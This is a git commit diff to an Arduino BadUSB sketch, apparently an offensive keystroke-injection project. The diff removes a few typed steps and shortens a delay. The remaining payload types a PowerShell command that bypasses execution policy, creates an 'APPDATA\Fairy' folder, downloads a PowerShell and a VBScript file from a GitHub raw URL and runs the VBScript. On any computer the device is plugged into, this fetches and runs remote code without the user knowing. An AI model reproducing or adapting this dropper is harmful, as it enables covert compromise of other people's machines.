ec52f8c89fad5fc1d77f358e8bcb5d2e5ef21aa5
h3xagon <62241425+h3xagon0001@users.noreply.github.com>
2025-07-01 10:21:21 +0800

    Update bad_usb.ino

--- bad_usb/bad_usb.ino
+++ bad_usb/bad_usb.ino
@@ -6,19 +6,7 @@ void setup() {
   Keyboard.begin();
   //////////// PAYLOAD START ////////////
 
-  delay(5000);  
-
-  // win+r 
-  Keyboard.press(windowsKey);
-  Keyboard.press('r');
-  Keyboard.releaseAll();
-  
-  delay(5000);
-
-  // enter powershell command
-  Keyboard.println("powershell");
-
-  delay(5000);
+  delay(3000);
 
   // enter deploy command
   Keyboard.println("powershell.exe -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name \"Fairy\" -ItemType \"Directory\" -Force; Set-Location -Path \"$($env:APPDATA)\\Fairy\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.ps1 -OutFile download.ps1; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.vbs -OutFile download.vbs; ./download.vbs}; exit");
@@ -28,5 +16,4 @@ void setup() {
 
 void loop() {
   // put your main code here, to run repeatedly:
-
 }
